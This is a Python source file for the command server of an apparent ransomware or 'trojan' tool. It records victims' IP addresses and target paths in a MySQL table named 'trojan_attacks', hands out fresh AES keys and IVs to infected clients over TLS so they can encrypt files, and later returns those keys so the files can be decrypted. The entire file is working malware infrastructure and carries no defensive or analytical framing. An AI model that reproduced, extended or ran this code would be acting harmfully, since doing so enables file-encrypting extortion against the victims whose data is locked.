import socket
import ssl
import mysql.connector
import os
import base64

def generate_key():
    """
    The function generate a key and return it in bytes.
        
    Parameters
    ----------
    None

    Returns
    -------
    Bytes
        A random bytes in 256 bits.
    """
    key = os.urandom(32)
    return key

def generate_iv():
    """
    The function generate a iv and return it in bytes.
        
    Parameters
    ----------
    None

    Returns
    -------
    Bytes
        A random bytes in 128 bits.
    """
    key = os.urandom(16)
    return key

def check_database(con, ip):
    """
    The function check if the ip is in the table in the database and if true return the values for the ip
    else return None.
        
    Parameters
    ----------
    con : PooledMySQLConnection | MySQLConnectionAbstract
        Connection the local database.

    ip : str
        The ip for checking in database.

    Returns
    -------
    List / None
        if the ip is in the database return list with the data else return None.
    """
    try:
        mycursor = con.cursor()
        mycursor.execute("SELECT * FROM trojan_attacks WHERE ip_address=%s", (ip,))
        result = mycursor.fetchall()
        return result[0]
    except IndexError:
        return None

try:
    # Try to connect local host database.
    con = mysql.connector.connect(
        host="localhost",
        user="root",
        password="",
        port="3306"
    )
    mycursor = con.cursor()
    # Create database if not exists.
    mycursor.execute("CREATE DATABASE IF NOT EXISTS trojan_database;")
    con = mysql.connector.connect(
        host="localhost",
        user="root",
        password="",
        port="3306",
        database="trojan_database"
    )
    # Create table in the database 'trojan_database' if not exists.
    mycursor = con.cursor()
    mycursor.execute("""CREATE TABLE IF NOT EXISTS trojan_attacks (
                        ip_address VARCHAR(16),
                        path VARCHAR(100),
                        initialization_vector VARCHAR(128),
                        secret_key VARCHAR(256)
                        );""")
except mysql.connector.Error as e:
    # If failed to connect to database.
    if e.errno == 2003:
        print("Can't connect to MySQL server")
    else:
        print(f"Error database : {e}")
    
# If successfully connected to database.
if con:
    # Creating server on my ip.
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_ip = '10.0.0.24'
    port = 7800
    server_socket.bind((server_ip, port))
    server_socket.listen(1)

    print(f"Server is listening : {server_ip} : {port}")
    client_socket, client_address = server_socket.accept()
    # Create ssl layer.
    ssl_connection = ssl.wrap_socket(client_socket, server_side=True, certfile="server.crt", keyfile="server.key")
    ip, port = ssl_connection.getpeername()

    # Check if the ip is already in the database.
    info = check_database(con, ip)
    isInDatabase = 0 if info == None else 1
    ssl_connection.send(isInDatabase.to_bytes(1, 'big'))

    # Get action from the software (1 - encryption, 2 - decryption).
    action = int.from_bytes(ssl_connection.recv(1), 'big')

    # If the action is encryption and the ip is not in the table.
    if action == 1 and info == None:
        # Recieve path
        bytes_size_path = int.from_bytes(ssl_connection.recv(32), byteorder="big")
        path = ssl_connection.recv(bytes_size_path).decode('utf-8')

        # Gen iv.
        iv = generate_iv()
        ssl_connection.sendall(iv)
        # Gen key.
        key = generate_key()
        ssl_connection.sendall(key)

        # Get Success status
        isSuccess = int.from_bytes(ssl_connection.recv(1), byteorder="big")
        if isSuccess == 1:
            # Insert the data to the database.
            mycursor = con.cursor()
            sql = "INSERT INTO trojan_attacks (ip_address, path, initialization_vector, secret_key) VALUES (%s, %s, %s, %s)"
            val = (ip, path, base64.b64encode(iv), base64.b64encode(key))
            mycursor.execute(sql, val)
            con.commit()

    # If the action is decryption and the ip is in the table.
    elif action == 2 and not info == None:
        # Sending the client the path, iv and key and if success delete the values of this ip.
        path = info[1]
        iv = base64.b64decode(info[2])
        secret_key = base64.b64decode(info[3])
        ssl_connection.send(len(path.encode('utf-8')).to_bytes(32, 'big'))
        ssl_connection.send(path.encode('utf-8'))
        ssl_connection.sendall(iv)
        ssl_connection.sendall(secret_key)
        # Get success status
        isSuccess = int.from_bytes(ssl_connection.recv(1), byteorder="big")
        if isSuccess == 1:
            mycursor.execute("DELETE FROM trojan_attacks WHERE ip_address=%s", (ip,))
            con.commit()

    client_socket.close()
    server_socket.close()
